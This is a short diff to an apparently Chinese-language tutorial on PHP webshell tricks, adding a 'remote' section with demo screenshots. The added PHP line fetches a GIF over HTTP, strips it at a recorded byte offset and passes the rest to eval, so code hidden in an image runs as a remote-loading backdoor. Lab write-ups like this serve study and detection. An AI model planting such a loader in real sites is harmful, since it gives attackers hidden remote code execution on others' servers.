@@ -294,7 +294,12 @@ echo substr("Hi!s9mf",3);
 ![26](https://ws1.sinaimg.cn/large/006VEsyOgy1g0s707dcz4g30pf0ic13s.gif)
 
 ### remote
-
+```php
+<?php
+                                    //远程加载的gif             //293930是刚才记录的文件长度
+eval(trim(substr(file_get_contents("http://localhost/test/k.gif"),293930)));
+```
+![27](https://ws1.sinaimg.cn/large/006VEsyOgy1g0s791xuohg30qb0l87wh.gif)
 
  
 
